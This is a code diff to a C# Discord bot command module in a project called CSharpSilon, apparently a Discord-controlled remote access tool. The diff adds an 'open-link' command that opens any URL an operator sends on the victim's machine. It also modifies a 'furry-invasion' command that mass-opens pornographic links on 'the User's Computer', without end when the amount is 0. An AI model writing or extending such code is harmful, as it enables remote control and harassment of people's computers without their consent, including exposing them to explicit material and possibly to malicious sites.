@@ -4,7 +4,7 @@ using Discord.Commands;
 
 namespace CSharpSilon.cmds
 {
-    public class FurryInvasion: ModuleBase<SocketCommandContext>
+    public class Links: ModuleBase<SocketCommandContext>
     {
         public string[] FurryLinks = new string[]
         {
@@ -41,7 +41,7 @@ namespace CSharpSilon.cmds
         
         
         [Command("furry-invasion")]
-        [Summary("Mass Opens Furry Porn On The User's Computer, Args: Amount (int, Default: 0) Changes The Amount Of Links To Open, 0 Will Do Infinite")]
+        [Summary("Mass Opens Furry Porn On The User's Computer, 0 Will Do Infinite")]
         public async Task FurryInv(int amount = 0)
         {
             
@@ -50,17 +50,27 @@ namespace CSharpSilon.cmds
             {
                 while (true)
                 {
-                    Utils.App.execute($"start {FurryLinks[_random.Next(0, FurryLinks.Length)]}");
+                    Utils.App.OpenLink(FurryLinks[_random.Next(0, FurryLinks.Length)]);
                 }
             }
             else
             {
                 for (int i = 0; i <= amount; i++)
                 {
-                    Utils.App.execute($"start {FurryLinks[_random.Next(0, FurryLinks.Length)]}");
+                    Utils.App.OpenLink(FurryLinks[_random.Next(0, FurryLinks.Length)]);
                 }
             }
         }
+
+        [Command("open-link"), Alias("openlink", "link")]
+        public async Task OpenLink(string link)
+        {
+            Utils.App.OpenLink(link);
+            await ReplyAsync($"Opened: {link}");
+            
+        }
+        
+        
         
         
     }
